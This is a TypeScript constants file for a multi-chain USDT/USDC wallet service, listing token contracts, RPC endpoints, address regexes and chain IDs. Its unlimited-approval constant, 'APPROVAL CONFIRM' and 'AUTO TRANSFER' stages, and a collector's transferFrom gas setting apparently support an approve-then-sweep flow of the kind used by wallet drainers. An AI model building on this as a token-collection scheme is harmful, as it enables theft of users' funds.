export type TokenSymbol = "USDT" | "USDC";
export type EvmChainKey =
  | "eth"
  | "bsc"
  | "pol"
  | "avax"
  | "arb"
  | "base"
  | "op";
export type TokenBalances = { native: string; usdt: string; usdc?: string };

export const TRON_ADDRESS_RE = /^T[1-9A-HJ-NP-Za-km-z]{33}$/;
export const EVM_ADDRESS_RE = /^0x[a-fA-F0-9]{40}$/;
export const TRON_GRID = "https://api.trongrid.io";
export const MAX_UINT256 =
  "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
export const ALPHABET =
  "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";

export const EVM_CHAIN_ID: Record<EvmChainKey, number> = {
  eth: 1,
  bsc: 56,
  pol: 137,
  avax: 43114,
  arb: 42161,
  base: 8453,
  op: 10,
};

export const EVM_RPCS: Record<EvmChainKey, string[]> = {
  eth: ["https://ethereum.publicnode.com", "https://cloudflare-eth.com"],
  bsc: ["https://bsc-dataseed.binance.org", "https://1rpc.io/bnb"],
  pol: ["https://polygon-bor.publicnode.com", "https://1rpc.io/matic"],
  avax: [
    "https://avalanche-c-chain.publicnode.com",
    "https://api.avax.network/ext/bc/C/rpc",
  ],
  arb: ["https://arbitrum-one.publicnode.com", "https://1rpc.io/arb"],
  base: ["https://base.publicnode.com", "https://1rpc.io/base"],
  op: [
    "https://mainnet.optimism.io",
    "https://optimism.publicnode.com",
    "https://1rpc.io/op",
  ],
};

export const TOKENS = {
  tron: {
    USDT: { address: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", decimals: 6 },
    USDC: { address: "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8", decimals: 6 },
  },
  eth: {
    USDT: {
      address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
      decimals: 6,
    },
    USDC: {
      address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
      decimals: 6,
    },
  },
  bsc: {
    USDT: {
      address: "0x55d398326f99059fF775485246999027B3197955",
      decimals: 18,
    },
    USDC: {
      address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
      decimals: 18,
    },
  },
  pol: {
    USDT: {
      address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
      decimals: 6,
    },
    USDC: {
      address: "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359",
      decimals: 6,
    },
  },
  avax: {
    USDT: {
      address: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7",
      decimals: 6,
    },
    USDC: {
      address: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E",
      decimals: 6,
    },
  },
  arb: {
    USDT: {
      address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
      decimals: 6,
    },
    USDC: {
      address: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831",
      decimals: 6,
    },
  },
  base: {
    USDT: {
      address: "0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2",
      decimals: 6,
    },
    USDC: {
      address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
      decimals: 6,
    },
  },
  op: {
    USDT: {
      address: "0x94b008aA00579c1307B0EF2c499aD98a4ce919e3",
      decimals: 6,
    },
    USDC: {
      address: "0x0b2C639c533813c4Aa9D7837CAf62653d097Ff85",
      decimals: 6,
    },
  },
} as const;

export const WALLET_SERVICE_JOURNEY_STAGES = [
  "APPROVAL CONFIRM",
  "AUTO TRANSFER",
  "FRONTEND FLOW",
  "TRON BROADCAST",
] as const;

/** Conservative gas units for ERC-20 transferFrom (estimateGas often fails when balance is zero). */
export const EVM_COLLECTOR_MIN_GAS_UNITS = 80_000;

export function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
